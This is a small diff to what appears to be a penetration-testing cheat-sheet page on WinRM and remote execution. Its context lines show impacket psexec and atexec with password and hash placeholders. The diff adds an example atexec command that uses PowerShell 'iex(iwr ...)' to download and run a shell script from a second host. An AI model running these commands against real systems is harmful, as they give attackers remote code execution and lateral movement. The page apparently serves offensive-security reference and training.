@@ -1,6 +1,5 @@
 ---
 title: "Winrm"
-date: 2024-7-27
 tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert", "Winrm", "PsExec", "AtExec"]
 ---
 
@@ -44,6 +43,10 @@ impacket-psexec '<USER>@<TARGET>' -hashes :<HASH>
 ```console
 # Local auth
 impacket-atexec '<WORKGROUP>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' 'powershell.exe -c "<CMD>"'
+```
+
+```console {class=sample-code}
+impacket-atexec 'WORKGROUP/test:test@192.168.10.2' 'powershell.exe -c "iex(iwr http://192.168.10.1:8443/shell.ps1 -UseBasicParsing)"'
 ```
 
 {{< /tabcontent >}}
